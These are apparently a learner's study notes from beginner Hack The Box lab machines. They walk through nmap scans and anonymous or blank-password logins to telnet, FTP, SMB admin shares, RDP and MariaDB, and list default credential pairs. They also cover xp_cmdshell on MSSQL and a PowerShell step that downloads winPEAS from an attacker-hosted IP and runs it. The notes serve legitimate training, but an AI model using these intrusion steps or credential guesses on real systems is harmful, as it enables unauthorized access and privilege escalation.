---
sort: 1
---

# Contemplate ! 
# ping
# /etc/hosts

# nmap 
Which Nmap switch can we use to enumerate machines when our packets are otherwise blocked by the Windows firewall?  ==> -Pn  ==> no Ping


## nmap services

PORT   STATE SERVICE
23/tcp open  telnet         

```bash
$ telnet <IP> <Port>
Login : username
Password : passwd
```

Account Misconfiguration Vuls:
root:root


```note
FTP : File Transfer Protocol, uses client-server communicaition model
FileZilla one popular GUI FTP program
running usually on port (21 tcp)
SFTP is the secure version of FTP   
vsFTPd 3.0.3 is one example on FTP services names/versions  

```


PORT   STATE SERVICE
21/tcp open  ftp


```bash
$ ftp
Name : anonymous
Password: `null`
230 Login successful.
```


--------

# Windows Machine

```note
SMB : Server Message Block Protocol, uses client-server communicaition model
port numbers 139 and 445
smbclient command launches an ftp-like client to access SMB/CIFS resources on servers.
```

Port 135:The Remote Procedure Call (RPC) service supports communication between Windowsapplications. Specifically, the service implements the RPC protocol — a low-level formof inter-process communication where a client process can make requests of a serverprocess. Microsoft’s foundational COM and DCOM technologies are built on top of RPC.The service’s name is RpcSs and it runs inside the shared services host process,svchost.exe. This is one of the main processes in any Windows operating system & itshould not be terminated.

Port 139:This port is used for NetBIOS. NetBIOS is an acronym for Network Basic Input/OutputSystem. It provides services related to the session layer of the OSI model allowingapplications on separate computers to communicate over a local area network. Asstrictly an API, NetBIOS is not a networking protocol. Older operating systems ranNetBIOS over IEEE 802.2 and IPX/SPX using the NetBIOS Frames (NBF) and NetBIOS overIPX/SPX (NBX) protocols, respectively. In modern networks, NetBIOS normally runs overTCP/IP via the NetBIOS over TCP/IP (NBT) protocol. This results in each computer in thenetwork having both an IP address and a NetBIOS name corresponding to a (possiblydifferent) host name. NetBIOS is also used for identifying system names inTCP/IP(Windows).Simply saying, it is a protocol that allows communication of files and printers throughthe Session Layer of the OSI Model in a LAN.

Port 445:This port is used for the SMB. SMB is a network file sharing protocol that requires anopen port on a computer or server to communicate with other systems. SMB ports aregenerally port numbers 139 and 445. Port 139 is used by SMB dialects that communicateover NetBIOS. It's a session layer protocol designed to use in Windows operatingsystems over a local network. Port 445 is used by newer versions of SMB (after Windows2000) on top of a TCP stack, allowing SMB to communicate over the Internet. This alsomeans you can use IP addresses in order to use SMB like file sharing.Simply saying, SMB has always been a network file sharing protocol. As such, SMBrequires network ports on a computer or server to enable communication to othersystems. SMB uses either IP port 139 or 445


Upon exploring the choices, we will settle on the command below, in order to list the various availableshares (-L) and to attempt a login as the `Administrator` account, which is the high privilege standardaccount for Windows operating systems


typically, the SMB server will request a password, but since wewant to cover all aspects of possible misconfigurations, we can attempt a passwordless login. Simply hittingthe Enter key when prompted for the Administrator password will send a blank input to the server.Wether it accepts it or not, we still need to discover.

```
-L : List available shares on the target.
-U : Login identity to use.
```

```
$ smbclient -L IP -U Administrator

Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available

```

# Foothold
From here we have two options of attack. One is loud, one is not.
> Smbclient simple navigation to C$ share with Administrator authorization
> PSexec.py from Impacket, involving Impacket installation and common attack surface, bigfingerprinting

## Option A: SMB Unprotected C$ Share

```
$ smbclient \\\\IP\ADMIN$ -U Administrator
```
instead of accessing the ADMIN$ share, we can access the C$ share, which is the file system of the Windowsmachine:

```
$ smbclient -N \\\\IP\C$ -U Administrator 
```


think about C$ as C:\\ in win10  




$ smbclient -N -L <IP>      ==> -N : no password 


PORT    STATE SERVICE
445/tcp open  microsoft-ds    


$ sudo apt install smbclient

```bash 
$ smbclient -L <IP>
Enter WORKGROUP\o54ma's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk

$ smbclient //<IP>/WorkShares     
Enter password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Mar 29 04:22:01 2021
  ..                                  D        0  Mon Mar 29 04:22:01 2021
  Amy.J                               D        0  Mon Mar 29 05:08:24 2021
  James.P                             D        0  Thu Jun  3 04:38:03 2021


smb: \> cd James.P
smb: \James.P\> ls
  .                                   D        0  Thu Jun  3 04:38:03 2021
  ..                                  D        0  Thu Jun  3 04:38:03 2021
  flag.txt                            A       32  Mon Mar 29 05:26:57 2021

smb: \James.P\> get flag.txt
getting file \James.P\flag.txt of size 32 as flag.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \James.P\> exit
```

What character at the end of a share name indicates it's an administrative share?   ==> $ 

Which Administrative share is accessible on the box that allows users to view the whole file system?  ==> C$ 

What does share mean ???????? 


------
# win / misconfiguration


```note 
RDP : Remote Desktop Protocol
```

PORT    STATE SERVICE VERSION
135/tcp open  msrpc   Microsoft Windows RPC


PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
random port



PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services



SSH uses public key cryptography



$ sudo apt install freerdp2-x11
xfreerdp : name of the tool that we can use to initiate a desktop projection to our host using the terminal


what is the switch used --> switch means flag --> flag means cli options of the commands -l -s -a .... 


```bash
$ xfreerdp /v:<IP>:3389 /cert:ignore /u:Administrator
Password: `null`
```



-------
# directory busting tool

gobuster 




# login pages

admin:password
admin:admin
root:root
root:password
admin:admin1
admin:password1
root:password1


```note
SQL : Structured Query Language
PII : Personally Identifiable Information
HTTPS : Hypertext Transfer Protocol Secure
```


1. misconfiguration 
2. sql injection ==> one by one ==> https://github.com/AdmiralGaust/SQL-Injection-cheat-sheet
lastChoice. Brute force 






```note
, which port running mysql do we find ==> 3306 
Which username allows us to log into MariaDB without providing a password? root 

$ mysql --host=<ip> --port=<port> --user=<root> --password `none` 
```





# Check Weppalyzer ... 


-----

# /etc/hosts 
his option refers to an issue with what is known as name-based VHosting (or VirtualHosting). According to the Wikipedia article on Virtual Hosting, we have the following statements

in short, multiple websites can share the same IP address, allowing users to access them separately byvisiting the specific hostnames  of each website instead of the hosting server's IP address. The webserver weare making requests to is throwing us an error because we haven't specified a certain hostname out of theones that could be hosted on that same target IP address. From here, we'd think that simply inputtingignition.htb instead of the target IP address into the search bar would solve our issue, but unfortunately,this is not the case. When entering a hostname instead of an IP address as the request's destination, there isa middleman involved that you might not know about

Because DNS is involved when translating the hostnames to the one IP address available on the server'sside, this will prove to be an issue once the target is isolated, such as in our case. In order to solve this, wecan edit our own local hosts file which includes correlations between hostnames and IP addresses toaccomodate for the lack of a DNS server doing it on our behalf.










-------
# CMS 
>Search for default <CMS NAME> login credintial ==> EX: default Jenkins login credentials on a fresh install
>default login page path.......etc
>EX: magento login credentials docs 





------
# CVE 
```note
CVE : Common Vulnerabilities and Exposures
```

collect any vesion numbers of any service and look for CVEs assocated to them

Groovy is a scripting language with Java-like syntax for the Java platform



----- 

PORT     STATE SERVICE
8080/tcp open  http-proxy

with -sV

PORT     STATE SERVICE VERSION
8080/tcp open  http    Jetty 9.4.39.v20210325








------
# SQL 

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server




M3g4c0rp123
User ID=ARCHETYPE\sql_svc

With the provided credentials we just need a way toconnect and authenticate to the MSSQL server ???  mssqlclient.py


What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server? 
 mssqlclient.py



Impacket is a collection of Python classes for working with network protocols. Impacket is focused on providing low-level programmatic access to the packets and for some protocols (e.g. SMB1-3 and MSRPC) the protocol implementation itself.


https://www.secureauth.com/labs/open-source-tools/impacket/

```
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip3 install .
# OR:
sudo python3 setup.py install
# In case you are missing some modules:
pip3 install -r requirements.txt

```

```
$ python3 mssqlclient.py -h
```




What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?  
xp_cmdshell 


extended stored procedure ??? 
Extended stored procedures are DLL files which are referenced by the SQL Server by having the extended stored procedure created which then reference functions or procedures within the DLL. The DLLs which are behind the extended stored procedures are typically created in a lower level language like C or C++



WinPEAS – Windows local Privilege Escalation Awesome Script (C#.exe and .bat)





-------
 
win CLI 

c> type == cat 
c> powershell -c 'command'


-------

win powershell 
 
c> powershell ==> to change to powershell 

p> wget http://10.10.16.12:8000/winPEASx64.exe -outfile winPEASx64.exe
p> ./winPEASx64.exe   ==> to run the exe 




https://www.hackingarticles.in/mssql-for-pentester-command-execution-with-xp_cmdshell/

https://www.hackingarticles.in/mssql-for-pentester-command-execution-with-xp_cmdshell/
https://linuxhint.com/run-wget-powershell/

https://www.hackthebox.com/achievement/machine/313810/287

to install winpeas ======> https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe


why python -m server.http ????? why not install it from github or something ?? 